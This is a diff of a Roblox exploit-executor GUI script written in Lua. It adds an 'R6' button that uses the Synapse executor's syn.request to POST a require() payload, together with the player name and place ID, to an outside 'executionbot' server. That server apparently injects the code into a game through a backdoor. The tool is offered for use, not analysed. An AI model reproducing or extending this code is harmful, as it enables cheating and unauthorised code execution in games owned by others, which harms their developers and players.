@@ -1,3 +1,5 @@
+--// Instances
+
 local Player = game.Players.LocalPlayer.Name
 
 local screen_gui = Instance.new("ScreenGui")
@@ -24,8 +26,8 @@ source.TextSize = 14
 source.TextXAlignment = Enum.TextXAlignment.Left
 source.TextYAlignment = Enum.TextYAlignment.Top
 source.BackgroundColor3 = Color3.new(1, 1, 1)
-source.Position = UDim2.new(0.0266343821, 0, 0.0517241359, 0)
-source.Size = UDim2.new(0, 390, 0, 224)
+source.Position = UDim2.new(0.0266343821, 0, 0.0517241396, 0)
+source.Size = UDim2.new(0, 390, 0, 237)
 source.Visible = true
 source.Name = "Source"
 source.Parent = main_frame
@@ -48,7 +50,7 @@ clear.Text = "Clear"
 clear.TextColor3 = Color3.new(0, 0, 0)
 clear.TextSize = 14
 clear.BackgroundColor3 = Color3.new(1, 1, 1)
-clear.Position = UDim2.new(0.392251819, 0, 0.781609058, 0)
+clear.Position = UDim2.new(0.348668277, 0, 0.781609058, 0)
 clear.Size = UDim2.new(0, 125, 0, 50)
 clear.Visible = true
 clear.Name = "clear"
@@ -63,6 +65,18 @@ script_2.Parent = main_frame
 local drag = Instance.new("LocalScript")
 drag.Name = "drag"
 drag.Parent = main_frame
+
+local r6 = Instance.new("TextButton")
+r6.Font = Enum.Font.SourceSans
+r6.Text = "R6"
+r6.TextColor3 = Color3.new(0, 0, 0)
+r6.TextSize = 14
+r6.BackgroundColor3 = Color3.new(1, 1, 1)
+r6.Position = UDim2.new(0.823244572, 0, 0.781609118, 0)
+r6.Size = UDim2.new(0, 61, 0, 50)
+r6.Visible = true
+r6.Name = "r6"
+r6.Parent = main_frame
 
 --//Modules
 
@@ -119,6 +133,28 @@ task.spawn(function()
 		})
 	end)
 	
+	script.Parent.r6.MouseButton1Click:Connect(function()
+		local Player = game.Players.LocalPlayer.Name
+		
+		local code = "require(6861971724).convert("..Player..")"
+		
+		local PlaceId = game.PlaceId
+		
+		local Data = {
+			placeid=PlaceId,
+			code=code
+		}
+		
+		syn.request({
+			Url="https://executionbot-1.typicalexploits.repl.co/code",
+			Method="POST",
+			Headers={
+				["Content-Type"]="application/json"
+			},
+			Body=game:GetService("HttpService"):JSONEncode(Data)
+		})
+	
+	end)
 end)
 
 -- drag
@@ -133,6 +169,5 @@ task.spawn(function()
 		return oldreq(target)
 	end
 
-	
 	local a=game:GetService("UserInputService")function drag(b)dragToggle=nil dragSpeed=0.23 dragInput=nil dragStart=nil dragPos=nil function updateInput(a)Delta=a.Position-dragStart Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+Delta.X,startPos.Y.Scale,startPos.Y.Offset+Delta.Y)game:GetService("TweenService"):Create(b,TweenInfo.new(0.25),{Position=Position}):Play()end b.InputBegan:Connect(function(c)if(c.UserInputType==Enum.UserInputType.MouseButton1 or c.UserInputType==Enum.UserInputType.Touch)and a:GetFocusedTextBox()==nil then dragToggle=true dragStart=c.Position startPos=b.Position c.Changed:Connect(function()if c.UserInputState==Enum.UserInputState.End then dragToggle=false end end)end end)b.InputChanged:Connect(function(a)if a.UserInputType==Enum.UserInputType.MouseMovement or a.UserInputType==Enum.UserInputType.Touch then dragInput=a end end)game:GetService("UserInputService").InputChanged:Connect(function(a)if a==dragInput and dragToggle then updateInput(a)end end)end drag(script.Parent)
 end)
